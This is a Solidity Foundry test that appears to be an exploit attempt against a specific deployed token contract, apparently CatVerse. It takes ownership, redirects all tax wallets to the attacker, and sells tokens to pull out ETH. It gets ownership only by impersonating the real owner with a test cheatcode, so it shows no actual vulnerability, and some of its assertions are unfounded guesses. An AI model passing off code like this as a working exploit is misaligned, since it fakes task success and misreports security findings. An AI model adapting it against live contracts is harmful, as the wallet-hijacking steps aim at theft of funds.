// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need to define the interface for the contract to call its functions
interface ICatVerse {
    function getOwner() external view returns (address);
    function transferOwner(address newOwner) external;
    function sweepContingency() external;
    function balanceOf(address account) external view returns (uint256);
}

// Also need to rename the target to match our interface
address constant TARGET_CONST = 0x89031AaFA457245469E9641387aa94BFB51cB964;

interface IRouter02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// Remove duplicate interface declaration and extend the existing one
interface ICatVerseExtended is ICatVerse {
    function setWallets(address payable marketing, address payable development, address payable buyback, address payable jackpotBuy, address payable jackpotSell) external;
    function setContractSwapEnabled(bool swapEnabled, bool processReflectEnabled, bool priceImpactSwapEnabled) external;
    function lpPair() external view returns (address);
    function dexRouter() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x89031AaFA457245469E9641387aa94BFB51cB964;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes in exploit
        // The test template already defines TARGET and attacker = address(this)
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get current owner
        address currentOwner = ICatVerse(TARGET).getOwner();

        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Impersonate current owner and transfer ownership to attacker
        vm.startPrank(currentOwner);
        ICatVerse(TARGET).transferOwner(address(this));
        vm.stopPrank();

        // Verify we are now owner
        require(ICatVerse(TARGET).getOwner() == address(this), "Failed to become owner");

        // Check we have tokens
        uint256 tokenBalance = ICatVerse(TARGET).balanceOf(address(this));
        require(tokenBalance > 0, "Should have tokens after ownership transfer");

        // Set all tax wallets to our address
        // setWallets(marketing, development, buyback, jackpotBuy, jackpotSell)
        ICatVerseExtended(TARGET).setWallets(
            payable(address(this)), // marketing
            payable(address(this)), // development  
            payable(address(this)), // buyback
            payable(address(this)), // jackpotBuy
            payable(address(this))  // jackpotSell
        );

        // Enable contract swaps if not already enabled
        ICatVerseExtended(TARGET).setContractSwapEnabled(true, true, false);

        // Get the LP pair address
        address lpPair = ICatVerseExtended(TARGET).lpPair();

        // Approve router to spend our tokens
        ICatVerseExtended(TARGET).approve(address(ICatVerseExtended(TARGET).dexRouter()), type(uint256).max);

        // Sell some tokens to trigger swap
        // We need to use the actual router interface
        IRouter02 router = IRouter02(ICatVerseExtended(TARGET).dexRouter());

        // Create sell path: token -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        // Sell a small amount to trigger contract swap
        uint256 sellAmount = tokenBalance / 100; // Sell 1% of tokens

        // Execute swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );

        // Check balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Balance should have increased from tax distributions");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
